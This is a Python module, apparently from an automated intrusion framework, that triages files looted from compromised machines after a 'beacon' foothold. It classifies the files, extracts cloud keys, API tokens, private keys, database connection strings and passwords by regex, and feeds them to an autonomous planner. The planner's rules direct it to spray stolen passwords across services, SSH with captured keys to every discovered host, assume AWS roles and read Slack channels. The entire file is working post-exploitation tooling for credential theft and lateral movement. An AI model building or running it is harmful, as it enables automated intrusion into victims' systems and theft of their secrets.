"""loot.py — post-beacon loot triage engine.

After a foothold, the beacon downloads files (beacon `download`, auto-mode
loot pulls). Today those files land in data/downloads/ and die there: the
operator would have to open each one by hand and grep for secrets. This
engine is the missing reader-and-decider:

  * CLASSIFY — what is this file? (config, script, key, credential store,
    archive, database dump, cloud credential, browser artifact...)
  * EXTRACT  — pull credential/secret material with pattern families per
    class: passwords, API keys, AWS/GCP/Azure keys, private keys, DB DSNs,
    connection strings, JWT secrets, .env values.
  * REGISTER — everything becomes WorldModel findings (creds / loot_secret
    / next_step) so the planner can CHAIN on it: an extracted password
    feeds cred_spray/ssh_login, an AWS key feeds cloud_creds_harvest, a
    web.config connection string feeds the DB capability.

Boundaries (deliberate):
  * Read-only: the engine never modifies or deletes loot.
  * Size-capped scans (a 4 GB dump is not read line-by-line into RAM).
  * Text-oriented; binary formats are identified but only their metadata
    (paths, embedded strings) is scanned.

Every extraction is a FINDING with provenance (file path + line) so the
operator can audit what auto-mode acted on.
"""

from __future__ import annotations

import base64
import os
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional

# ── scan limits ─────────────────────────────────────────────────────────────
_MAX_FILE_BYTES = 2 * 1024 * 1024     # 2 MB text window per file
_MAX_FILES_PER_RUN = 200
_MAX_FINDINGS_PER_FILE = 40

# ── file-class rules: filename patterns -> class ────────────────────────────
_FILE_CLASSES: List[tuple] = [
    # (regex on basename, class label)
    (r"\.env$|\.env\.", "dotenv"),
    (r"web\.config$|appsettings", "dotnet_config"),
    (r"\.config$|\.conf$|\.ini$|\.cfg$", "config"),
    (r"\.yaml$|\.yml$", "yaml_config"),
    (r"docker-compose|Dockerfile", "container_config"),
    (r"\.sql$|dump\.|\.db$|\.sqlite", "database_dump"),
    (r"id_rsa|id_dsa|id_ecdsa|\.pem$|\.key$|\.ppk$", "private_key"),
    (r"\.crt$|\.cer$|\.pub$", "public_cert"),
    (r"credentials|\.aws|\.kube|config$.*kube", "cloud_config"),
    (r"\.htpasswd$|shadow$|passwd$|sam$|system$", "system_creds"),
    (r"history$|\.bash_history|\.ps1$|\.sh$|\.bat$|\.vbs$", "script"),
    (r"\.zip$|\.tar|\.gz$|\.7z$|\.rar$", "archive"),
    (r"\.xml$|\.json$", "structured_data"),
    (r"wp-config|config\.php|database\.php|\.env\.php", "php_config"),
    (r"secrets|password|cred|token", "secret_named"),
]

# ── secret patterns: label -> compiled regex ────────────────────────────────
# Each pattern family extracts (label, value). Values are trimmed to
# reasonable lengths and deduped per file.
_SECRET_PATTERNS: List[tuple] = [
    # AWS access key id + secret
    (r"\b(AKIA[0-9A-Z]{16})\b", "aws_access_key"),
    (r"aws_secret_access_key\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})['\"]?",
     "aws_secret_key"),
    (r"\b(A3T[A-Z0-9]{16}|ASIA[0-9A-Z]{16})\b", "aws_temp_key"),
    # GCP / service accounts
    (r'"type"\s*:\s*"service_account"', "gcp_service_account"),
    (r"\b(AIza[0-9A-Za-z_\-]{35})\b", "google_api_key"),
    # Azure
    (r"\b([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})\b",
     "azure_uuid"),
    # generic API keys / tokens
    (r"\b(sk_live_[0-9a-zA-Z]{24,})\b", "stripe_key"),
    (r"\b(ghp_[0-9A-Za-z]{36})\b", "github_token"),
    (r"\b(xox[baprs]-[0-9A-Za-z\-]{10,})\b", "slack_token"),
    (r"\b(glpat-[0-9A-Za-z\-_]{20,})\b", "gitlab_token"),
    (r"\b(eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})\b",
     "jwt"),
    # private key blocks
    (r"-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----",
     "private_key_block"),
    # database / connection strings
    (r"(?i)\b(mysql|postgres(ql)?|mongodb(\+srv)?|mssql|amqp|redis|ftp)"
     r"://[^:\s'\"]+:[^@\s'\"]+@[^\s'\"]+", "connection_string"),
    (r"(?i)Data Source=[^;]+;[^;]*Password=([^;\s'\"]+)", "dotnet_dsn"),
    (r"(?i)DB_PASSWORD\s*[=:]\s*['\"]?([^\s'\"]{4,})['\"]?", "db_password"),
    # unix / app credentials
    (r"(?i)password\s*[=:]\s*['\"]([^\s'\"]{4,64})['\"]", "password_literal"),
    (r"(?i)\b(passwd|pass|pwd)\s*[=:]\s*([^\s'\"]{4,64})", "password_value"),
    (r"^\s*([A-Za-z_][A-Za-z0-9_]{2,30})\s*[:=]\s*([^\s#'\"]{8,64})\s*$",
     "env_assignment"),
    # ssh / host hints for lateral movement
    (r"(?i)hostname\s*=\s*([^\s,;]+)", "ssh_host"),
]


@dataclass
class LootHit:
    """One extracted secret/hint with its provenance."""
    label: str          # password_literal | aws_access_key | ...
    value: str
    path: str           # absolute path of the loot file
    line: int = 0
    context: str = ""   # the matching line, trimmed

    def to_dict(self) -> dict:
        return {"label": self.label, "value": self.value, "path": self.path,
                "line": self.line, "context": self.context[:120]}


@dataclass
class LootReport:
    """Triage result for one directory sweep."""
    files_seen: int = 0
    files_classified: Dict[str, str] = field(default_factory=dict)
    hits: List[LootHit] = field(default_factory=list)
    next_steps: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "files_seen": self.files_seen,
            "classes": dict(list(self.files_classified.items())[:20]),
            "hits": [h.to_dict() for h in self.hits[:40]],
            "next_steps": self.next_steps,
        }


def classify_file(path: str) -> str:
    """Basename-driven file class (dotenv, private_key, database_dump...)."""
    base = os.path.basename(path).lower()
    for pattern, cls in _FILE_CLASSES:
        if re.search(pattern, base):
            return cls
    return "generic"


def _window(path: str) -> str:
    """Read a bounded text window; binary files yield mostly junk which the
    pattern scan tolerates (worst case: no hits)."""
    try:
        with open(path, "rb") as fh:
            raw = fh.read(_MAX_FILE_BYTES)
    except OSError:
        return ""
    text = raw.decode("utf-8", errors="replace")
    return text


def scan_file(path: str) -> List[LootHit]:
    """Extract every secret family from one loot file (deduped, capped)."""
    cls = classify_file(path)
    if cls in ("archive",):
        return []          # binary container: no line-level value
    text = _window(path)
    if not text:
        return []
    hits: List[LootHit] = []
    seen: set = set()
    for pattern, label in _SECRET_PATTERNS:
        for m in re.finditer(pattern, text, re.MULTILINE):
            value = (m.group(1) if m.groups() else m.group(0)).strip()
            if not value or len(value) > 200:
                continue
            key = (label, value)
            if key in seen:
                continue
            seen.add(key)
            line_no = text.count("\n", 0, m.start()) + 1
            context = text[max(0, m.start() - 20):m.end() + 20]
            hits.append(LootHit(label=label, value=value, path=path,
                                line=line_no, context=context.strip()))
            if len(hits) >= _MAX_FINDINGS_PER_FILE:
                return hits
    return hits


def scan_dir(directory: str, recursive: bool = True,
             max_files: int = _MAX_FILES_PER_RUN) -> LootReport:
    """Sweep data/downloads (or any dir) and triage every file.

    Recursive by default: downloaded loot lands in per-beacon subfolders,
    and the interesting file is almost never at the top level."""
    report = LootReport()
    if not os.path.isdir(directory):
        return report
    count = 0
    walker = os.walk(directory) if recursive else [(directory, [], sorted(os.listdir(directory)))]
    for root, _dirs, files in walker:
        for name in sorted(files):
            if count >= max_files:
                report.next_steps = derive_next_steps(report)
                return report
            path = os.path.join(root, name)
            count += 1
            report.files_seen += 1
            cls = classify_file(path)
            report.files_classified[path] = cls
            for hit in scan_file(path):
                report.hits.append(hit)
    report.next_steps = derive_next_steps(report)
    return report


# ── next-step inference: extracted material -> planner-consumable advice ────

_NEXT_STEP_RULES: List[tuple] = [
    ("aws_access_key", "cloud: harvest AWS with the captured access key "
     "(cloud_creds_harvest)"),
    ("aws_secret_key", "cloud: pair the secret key with the access key and "
     "assume roles (cloud_access)"),
    ("gcp_service_account", "cloud: GCP service-account JSON captured — use "
     "it for token exchange (cloud_creds)"),
    ("google_api_key", "cloud: Google API key captured — enumerate GCP "
     "surface (cloud_access)"),
    ("private_key_block", "lateral: private key captured — try SSH as its "
     "owners on every discovered host (ssh_login)"),
    ("connection_string", "db: connection string captured — connect and dump "
     "schema + users (db exploitation)"),
    ("dotnet_dsn", "db: .NET connection string captured — extract the DB "
     "password and spray it cross-service (cred_spray)"),
    ("db_password", "creds: database password captured — spray it "
     "cross-service and try the DB port directly (cred_spray)"),
    ("password_literal", "creds: literal password captured — validate it "
     "across ssh/smb/db services (cred_spray)"),
    ("password_value", "creds: password captured — validate it across all "
     "sprayable services (cred_spray)"),
    ("jwt", "web: JWT captured — decode claims, check alg=none / weak secret "
     "(web exploitation)"),
    ("github_token", "osint: GitHub token captured — enumerate private repos "
     "of the org for secrets (osint)"),
    ("slack_token", "osint: Slack token captured — read channels for secrets "
     "and internal hosts (osint)"),
    ("ssh_host", "lateral: internal hostname found — add to pivot candidates "
     "(lateral_pivot)"),
]


def derive_next_steps(report: LootReport) -> List[str]:
    """Loot material -> concrete next moves (deduped, planner-shaped)."""
    labels = {h.label for h in report.hits}
    out: List[str] = []
    for label, advice in _NEXT_STEP_RULES:
        if label in labels and advice not in out:
            out.append(advice)
    return out


def register_findings(wm, report: LootReport, source: str = "loot_triage") -> int:
    """Push extracted material into the WorldModel so the planner chains:
    passwords -> creds, cloud keys -> cloud_creds, hosts -> attack surface."""
    added = 0
    for h in report.hits[:60]:
        if h.label in ("password_literal", "password_value", "dotnet_dsn",
                       "db_password"):
            wm.add_finding("creds", key=f"loot:{h.label}:{h.value[:24]}",
                           value={"username": "", "password": h.value,
                                  "service": "", "valid": False,
                                  "method": "loot_extraction",
                                  "provenance": f"{h.path}:{h.line}"},
                           confidence=0.6, source=source)
            added += 1
        elif h.label in ("aws_access_key", "aws_secret_key", "aws_temp_key",
                         "gcp_service_account", "google_api_key"):
            wm.add_finding("cloud_creds", key=f"loot:{h.label}",
                           value={"kind": h.label,
                                  "provenance": f"{h.path}:{h.line}"},
                           confidence=0.7, source=source)
            added += 1
        elif h.label == "ssh_host":
            wm.add_finding("host", key=f"loot-host:{h.value}",
                           value={"ip": h.value, "source": "loot"},
                           confidence=0.5, source=source)
            added += 1
    return added


def triage_and_register(wm, directory: str) -> LootReport:
    """Convenience: scan + register in one call (the agent's post-beacon
    wave calls this)."""
    report = scan_dir(directory)
    register_findings(wm, report)
    return report


__all__ = ["LootHit", "LootReport", "classify_file", "scan_file", "scan_dir",
           "derive_next_steps", "register_findings", "triage_and_register"]
